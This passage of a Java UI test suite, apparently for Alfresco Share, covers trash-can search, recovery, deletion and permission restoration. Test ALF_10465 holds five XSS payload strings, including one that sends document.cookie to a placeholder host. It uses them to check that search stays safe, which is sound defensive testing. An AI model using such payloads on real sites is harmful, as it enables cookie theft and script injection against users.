        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1));

        ShareUser.logout(drone);

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10462() throws Exception
    {
        String testName = getTestName();

        String siteName1 = getSiteName(testName);

        String testUser = getUserNameForDomain(testName + "1", testDomainFree);

        String fileName1 = "f1-" + getFileName(testName) + ".txt";
        String fileName2 = "f2-" + getFileName(testName) + ".txt";

        String folderName1 = "f3-" + getFolderName(testName);
        String folderName2 = "f4-" + getFolderName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10462() throws Exception
    {
        String testName = getTestName();

        String testUser = getUserNameForDomain(testName + "1", testDomainFree);

        String fileName1 = "f1-" + getFileName(testName) + ".txt";
        String fileName2 = "f2-" + getFileName(testName) + ".txt";

        String folderName1 = "f3-" + getFolderName(testName);
        String folderName2 = "f4-" + getFolderName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        TrashCanPage trashCanPage = ShareUserProfile.navigateToTrashCan(drone);

        // Search for file includes file in the results
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName1).contains(fileName1));

        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, fileName2).contains(fileName2));
        Assert.assertTrue(trashCanPage.getTrashCanItemForContent(TrashCanValues.FILE, fileName2, "documentLibrary").size() > 0);

        // Search for folder includes folder in the results
        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName1).contains(folderName1));

        Assert.assertTrue(ShareUserProfile.getTrashCanItems(drone, folderName2).contains(folderName2));
        Assert.assertTrue(trashCanPage.getTrashCanItemForContent(TrashCanValues.FOLDER, folderName2, "documentLibrary").size() > 0);

        ShareUser.logout(drone);

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10463() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);
        String testUser = getUserNameForDomain(testName + "1", testDomainFree);

        String fileName1 = "fi1-" + getFileName(testName);
        String fileName2 = "fi2-" + getFileName(testName);

        String folderName1 = "fo3-" + getFolderName(testName);
        String folderName2 = "fo4-" + getFolderName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10463() throws Exception
    {
        // dataPrep_TrashCan_ALF_10463(drone);
        String testName = getTestName();
        String testUser = getUserNameForDomain(testName + "1", testDomainFree);

        String fileName1 = "fi1-" + getFileName(testName);
        String fileName2 = "fi2-" + getFileName(testName);

        String folderName1 = "fo3-" + getFolderName(testName);
        String folderName2 = "fo4-" + getFolderName(testName);

        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        // Empty String search
        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, "");

        Assert.assertTrue(nameOfItems.contains(fileName1));
        Assert.assertTrue(nameOfItems.contains(fileName2));
        Assert.assertTrue(nameOfItems.contains(folderName1));
        Assert.assertTrue(nameOfItems.contains(folderName2));

        // Search: ends with common term: *testName
        nameOfItems = ShareUserProfile.getTrashCanItems(drone, "*" + testName);

        Assert.assertTrue(nameOfItems.contains(fileName1));
        Assert.assertTrue(nameOfItems.contains(fileName2));
        Assert.assertTrue(nameOfItems.contains(folderName1));
        Assert.assertTrue(nameOfItems.contains(folderName2));

        // Search: starts with common term: fo*
        nameOfItems = ShareUserProfile.getTrashCanItems(drone, "fo*");
        Assert.assertFalse(nameOfItems.contains(fileName1));
        Assert.assertFalse(nameOfItems.contains(fileName2));
        Assert.assertTrue(nameOfItems.contains(folderName1));
        Assert.assertTrue(nameOfItems.contains(folderName2));

        // Search: starts with common term: fi*
        nameOfItems = ShareUserProfile.getTrashCanItems(drone, "fi*");
        Assert.assertTrue(nameOfItems.contains(fileName1));
        Assert.assertTrue(nameOfItems.contains(fileName2));
        Assert.assertFalse(nameOfItems.contains(folderName1));
        Assert.assertFalse(nameOfItems.contains(folderName2));

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, fileName1 + "*");
        Assert.assertTrue(nameOfItems.contains(fileName1));
        Assert.assertFalse(nameOfItems.contains(fileName2));
        Assert.assertFalse(nameOfItems.contains(folderName1));
        Assert.assertFalse(nameOfItems.contains(folderName2));

        ShareUser.logout(drone);

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10464() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);

        String testUser = getUserNameForDomain(testName + "1", testDomainFree);

        String fileName1 = "fi1-" + getFileName(testName);
        String fileName2 = "fi2-" + getFileName(testName);

        String folderName1 = "fo3-" + getFolderName(testName);
        String folderName2 = "fo4-" + getFolderName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });
        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10464() throws Exception
    {

        String testName = getTestName();
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String fileName1 = "fi1-" + getFileName(testName);
        String fileName2 = "fi2-" + getFileName(testName);
        String folderName1 = "fo3-" + getFolderName(testName);
        String folderName2 = "fo4-" + getFolderName(testName);

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, "");

        Assert.assertTrue(nameOfItems.contains(fileName1));
        Assert.assertTrue(nameOfItems.contains(fileName2));
        Assert.assertTrue(nameOfItems.contains(folderName1));
        Assert.assertTrue(nameOfItems.contains(folderName2));

        ShareUser.logout(drone);

    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10465() throws Exception
    {
        String testName = getTestName();
        String siteName1 = getSiteName(testName);

        String testUser = getUserNameForDomain(testName, testDomainFree);

        String fileName1 = "fi1-" + getFileName(testName);
        String fileName2 = "fi2-" + getFileName(testName);

        String folderName1 = "fo3-" + getFolderName(testName);
        String folderName2 = "fo4-" + getFolderName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser });
        
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        
        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        
        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        ShareUser.uploadFileInFolder(drone, new String[] { fileName2, DOCLIB });
        
        ShareUserSitePage.createFolder(drone, folderName1, folderName1);
        ShareUserSitePage.createFolder(drone, folderName2, folderName2);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, fileName2);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.selectContentCheckBox(drone, folderName2);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10465() throws Exception
    {
        String testName = getTestName();
        String trashcanUser1 = getUserNameForDomain(testName, testDomainFree);

        String XSS_STRING_1 = "<IMG \"\"\"><SCRIPT>alert(\"test\")</SCRIPT>\">";
        String XSS_STRING_2 = "<img src=\"1\" onerror=\"window.open('http://somenastyurl?'+(document.cookie))\">";
        String XSS_STRING_3 = "<DIV STYLE=\"width: expression(alert('XSS'));\">";
        String XSS_STRING_4 = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">";
        String XSS_STRING_5 = "<img><scrip<script>t>alert('XSS');<</script>/script>";

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_1);
        Assert.assertTrue(nameOfItems.isEmpty());

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_2);
        Assert.assertTrue(nameOfItems.isEmpty());

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_3);
        Assert.assertTrue(nameOfItems.isEmpty());

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_4);
        Assert.assertTrue(nameOfItems.isEmpty());

        nameOfItems = ShareUserProfile.getTrashCanItems(drone, XSS_STRING_5);
        Assert.assertTrue(nameOfItems.isEmpty());

        ShareUser.logout(drone);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_10468() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String trashcanUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        String fileName1 = getFileName(testName);
        String folderName1 = getFolderName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser1 });
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser2 });

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUser.selectContentCheckBox(drone, fileName1);

        ShareUser.selectContentCheckBox(drone, folderName1);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_10468() throws Exception
    {
        String testName = getTestName();

        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String trashcanUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        String fileName1 = getFileName(testName);

        String folderName1 = getFolderName(testName);

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        String url = getShareUrl();
        if(alfrescoVersion.isCloud())
        {
             url = url+"/"+getUserDomain(trashcanUser2);
        }        

        drone.navigateTo(url + "/page/user/" + trashcanUser2 + "/user-trashcan");

        ((TrashCanPage) drone.getCurrentPage()).render();
        List<String> nameOfItems = ShareUserProfile.getTrashCanItems(drone, "");
        Assert.assertTrue(nameOfItems.contains(fileName1));

        Assert.assertTrue(nameOfItems.contains(folderName1));

        Assert.assertTrue(drone.getCurrentUrl().contains(trashcanUser2));
        Assert.assertFalse(drone.getCurrentUrl().contains(trashcanUser1));

        ShareUser.logout(drone);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15279() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser1 });

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15279() throws Exception
    {
        String testName = getTestName();
        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";

        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);

        String siteName1 = getSiteName(testName);

        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();

        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });
        
        ShareUserSitePage.addComment(drone, fileName1, commentForFile);
        
        ShareUser.openDocumentLibrary(drone);

        ShareUserSitePage.createFolder(drone, folderName1, folderName1);         

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);

        ShareUser.openDocumentLibrary(drone);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(fileName1));

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(folderName1));

        ShareUser.logout(drone);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15280() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser1 });

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(drone);

    }

    @Test(groups = { "TrashCan" })
    public void ALF_15280() throws Exception
    {

        String testName = getTestName();

        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);

        String siteName1 = getSiteName(testName);

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";
        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();

        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        DocumentLibraryPage docLibPage = ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.addComment(drone, fileName1, commentForFile);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);
        
        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);
        ShareUserProfile.recoverTrashCanItem(drone, fileName1);

        ShareUserProfile.recoverTrashCanItem(drone, folderName1);

        ShareUser.logout(drone);

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName1));

        DocumentDetailsPage docDetailsPage = docLibPage.selectFile(fileName1).render();

        Assert.assertTrue(docDetailsPage.getComments().contains(commentForFile));

        docLibPage = ShareUser.openDocumentLibrary(drone);

        Assert.assertTrue(docLibPage.isFileVisible(folderName1));

        FolderDetailsPage folderDetailsPage = docLibPage.getFileDirectoryInfo(folderName1).selectViewFolderDetails().render();

        Assert.assertTrue(folderDetailsPage.getComments().contains(commentForFolder));

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);
     
        ManagePermissionsPage managePermissionPage = ShareUserSitePage.manageContentPermissions(drone, fileName1);
   
        String role = managePermissionPage.getInheritedPermissions().get(getCustomRoleName(siteName1, UserRole.SITEMANAGER));
        Assert.assertEquals(role, UserRole.SITEMANAGER.getRoleName());
        managePermissionPage.selectCancel().render();
        docLibPage = ShareUser.openDocumentLibrary(drone);
      
        managePermissionPage = ShareUserSitePage.manageContentPermissions(drone, folderName1);
   
        role =  managePermissionPage.getInheritedPermissions().get(getCustomRoleName(siteName1, UserRole.SITEMANAGER));
        Assert.assertEquals(role, UserRole.SITEMANAGER.getRoleName());
        managePermissionPage.selectCancel().render();

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1));

        ShareUser.logout(drone);

        // Check for Admin
        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1));

        ShareUser.logout(drone);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15281() throws Exception
    {

        String testName = getTestName();
        String siteName1 = getSiteName(testName);
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser1 });

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);
        ShareUser.createSite(drone, siteName1, SITE_VISIBILITY_PUBLIC);
        ShareUser.logout(drone);

    }

    @Test(groups = { "TrashCan" })
    public void ALF_15281() throws Exception
    {
        String testName = getTestName();
        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";
        String trashcanUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String siteName1 = getSiteName(testName);
        String folderName1 = "fo3-" + getFolderName(testName) + System.currentTimeMillis();
        String commentForFile = "Whats up " + fileName1 + ", How you doing?";
        String commentForFolder = "Whats up " + folderName1 + ", How you doing?";

        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        DocumentLibraryPage docLibPage = ShareUserSitePage.createFolder(drone, folderName1, folderName1);

        ShareUserSitePage.addComment(drone, fileName1, commentForFile);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.addComment(drone, folderName1, commentForFolder);
        
        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.selectContentCheckBox(drone, folderName1);

        ShareUser.deleteSelectedContent(drone);

        ShareUser.logout(drone);

        ShareUser.login(drone, ADMIN_USERNAME, ADMIN_PASSWORD);

        ShareUserProfile.navigateToTrashCan(drone);
        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, fileName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(fileName1));
        ShareUserProfile.deleteTrashCanItem(drone, fileName1);

        trashCanItem = ShareUserProfile.getTrashCanItem(drone, folderName1);
        Assert.assertTrue(trashCanItem.getFileName().equalsIgnoreCase(folderName1));
        ShareUserProfile.deleteTrashCanItem(drone, folderName1);

        ShareUser.logout(drone);

        // Check content as User
        ShareUser.login(drone, trashcanUser1, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertFalse(docLibPage.isFileVisible(fileName1));
        Assert.assertFalse(docLibPage.isFileVisible(folderName1));

        ShareUserProfile.navigateToTrashCan(drone);

        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, fileName1));
        Assert.assertFalse(ShareUserProfile.isTrashCanItemPresent(drone, folderName1));

        ShareUser.logout(drone);
    }

  @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15282() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { trashcanUser });
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15282() throws Exception
    {

        String testName = getTestName();
        String trashcanUser = getUserNameForDomain(testName, testDomainFree);
        String siteName1 = getSiteName(testName) + System.currentTimeMillis();

        String folder = getFolderName(testName) + System.currentTimeMillis();
        String fileName = getFileName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, trashcanUser, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName1, siteName1, SITE_VISIBILITY_PUBLIC, true);
        
        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        
        ShareUser.uploadFileInFolder(drone, new String[] { fileName });
        
        ShareUserSitePage.createFolder(drone, folder, folder);

        SiteUtil.deleteSite(drone, siteName1);
        String dateOfSiteDeletaion = ShareUser.getDate(format);

        ShareUserProfile.navigateToTrashCan(drone);

        TrashCanItem trashCanItem = ShareUserProfile.getTrashCanItem(drone, siteName1);        

        Assert.assertTrue(trashCanItem.getDate().contains(dateOfSiteDeletaion));
        Assert.assertTrue(trashCanItem.getUserFullName().contains(trashcanUser));
        
        ShareUserProfile.recoverTrashCanItem(drone, siteName1);

        DocumentLibraryPage docLibPage = ShareUser.openSiteDocumentLibraryFromSearch(drone, siteName1);

        Assert.assertTrue(docLibPage.isFileVisible(fileName));
        Assert.assertTrue(docLibPage.isFileVisible(folder));

        SiteUtil.deleteSite(drone, siteName1);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.deleteTrashCanItem(drone, siteName1);

        Assert.assertFalse(SiteUtil.searchSiteWithRetry(drone, siteName1, false).getSiteList().contains(siteName1));
    }

   @Test(groups = { "DataPrepTrashCan" }) 
    public void dataPrep_TrashCan_ALF_15277() throws Exception
    {

        String testName = getTestName();
        String testUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String testUser2 = getUserNameForDomain(testName + "2", testDomainFree);
        String siteName1 = getSiteName(testName) + "-1";

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser1 });
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser2 });

        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName1, siteName1, SITE_VISIBILITY_PUBLIC, true);
        
        ShareUserMembers.inviteUserToSiteWithRole(drone, testUser1, testUser2, siteName1, UserRole.CONTRIBUTOR);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15277() throws Exception
    {
        String testName = getTestName();
        String testUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String testUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        String siteName1 = getSiteName(testName) + "-1";

        String fileName1 = "fi1-" + getFileName(testName) + System.currentTimeMillis() + ".txt";

        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        DocumentLibraryPage docLibPage = ShareUser.uploadFileInFolder(drone, new String[] { fileName1, DOCLIB });

        ShareUser.returnManagePermissionPage(drone, fileName1);

        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, false);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.selectContentCheckBox(drone, fileName1);
        ShareUser.deleteSelectedContent(drone);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.recoverTrashCanItem(drone, fileName1);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ManagePermissionsPage permissionPage = ShareUser.returnManagePermissionPage(drone, fileName1);

        Assert.assertEquals(UserRole.COLLABORATOR, permissionPage.getExistingPermission(testUser2));

        ShareUser.logout(drone);

        // Checks for User: Collaborator
        ShareUser.login(drone, testUser2, DEFAULT_PASSWORD);

        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.getFileDirectoryInfo(fileName1).isInlineEditLinkPresent());

        ShareUser.logout(drone);
    }

     @Test(groups = { "DataPrepTrashCan"})
    public void dataPrep_TrashCan_ALF_15278() throws Exception
    {
        String testName = getTestName();

        String testUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String testUser2 = getUserNameForDomain(testName + "2", testDomainFree);

        String siteName1 = getSiteName(testName);

        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser1 });
        CreateUserAPI.CreateActivateUser(drone, adminUserFree, new String[] { testUser2 });
        
        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        SiteUtil.createSite(drone, siteName1, siteName1, SITE_VISIBILITY_PUBLIC, true);

        ShareUserMembers.inviteUserToSiteWithRole(drone, testUser1, testUser2, siteName1, UserRole.COLLABORATOR);

        ShareUser.logout(drone);
    }

    @Test(groups = { "TrashCan" })
    public void ALF_15278() throws Exception
    {
        String testName = getTestName();

        String testUser1 = getUserNameForDomain(testName + "1", testDomainFree);
        String testUser2 = getUserNameForDomain(testName + "2", testDomainFree);
       

        String siteName1 = getSiteName(testName);

        String folderName = getFolderName(testName) + System.currentTimeMillis();

        ShareUser.login(drone, testUser1, DEFAULT_PASSWORD);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUserSitePage.createFolder(drone, folderName, folderName);
        
        ShareUserSitePage.manageContentPermissions(drone, folderName);
        
        ShareUserMembers.addUserOrGroupIntoInheritedPermissions(drone, testUser2, true, UserRole.COLLABORATOR, true);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);

        ShareUser.selectContentCheckBox(drone, folderName);
     
        ShareUser.deleteSelectedContent(drone);

        ShareUserProfile.navigateToTrashCan(drone);

        ShareUserProfile.recoverTrashCanItem(drone, folderName);

        ShareUser.openSitesDocumentLibrary(drone, siteName1);
        
        ManagePermissionsPage permissionPage = ShareUserSitePage.manageContentPermissions(drone, folderName);

        Assert.assertEquals(UserRole.COLLABORATOR, permissionPage.getExistingPermission(testUser2));

        ShareUser.logout(drone);

        // Checks for User: Collaborator
        ShareUser.login(drone, testUser2, DEFAULT_PASSWORD);

        DocumentLibraryPage docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);

        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isEditPropertiesLinkPresent());

        ShareUser.logout(drone);

//        // Checks for Group: Collaborator
//        ShareUser.login(drone, testUser3, DEFAULT_PASSWORD);
//
//        docLibPage = ShareUser.openSitesDocumentLibrary(drone, siteName1);
//
//        Assert.assertTrue(docLibPage.getFileDirectoryInfo(folderName).isSyncToCloudLinkPresent());
//
//        ShareUser.logout(drone);
    }

     @Test(groups = { "DataPrepTrashCan", "HybridSync", "Enterprise42" })
    public void dataPrep_TrashCan_ALF_15273() throws Exception
    {
        String testName = getTestName();
        String user1 = getUserNameForDomain(testName, testDomain);
        String[] userInfo1 = new String[] { user1 };

        String cloudUser = getUserNameForDomain(testName, testDomain);
        String[] cloudUserInfo1 = new String[] { cloudUser };

        String opSiteName = getSiteName(testName) + "-OP";
        String cloudSiteName = getSiteName(testName) + "-CL";

        // Create User1 (On-premise)
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, userInfo1);

        // Create User1 (Cloud)
        CreateUserAPI.CreateActivateUser(hybridDrone, ADMIN_USERNAME, cloudUserInfo1);
        CreateUserAPI.upgradeCloudAccount(hybridDrone, ADMIN_USERNAME, testDomain, "1000");

        // Login to User1, set up the cloud sync
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        signInToAlfrescoInTheCloud(drone, cloudUser, DEFAULT_PASSWORD);

        ShareUser.logout(drone);

        ShareUser.login(hybridDrone, user1, DEFAULT_PASSWORD);

        ShareUser.createSite(hybridDrone, cloudSiteName, SITE_VISIBILITY_PUBLIC);

        ShareUser.logout(hybridDrone);

        // Login as Enterprise user, create site
        ShareUser.login(drone, user1, DEFAULT_PASSWORD);

        ShareUser.createSite(drone, opSiteName, SITE_VISIBILITY_PUBLIC);

        ShareUser.logout(drone);

    }

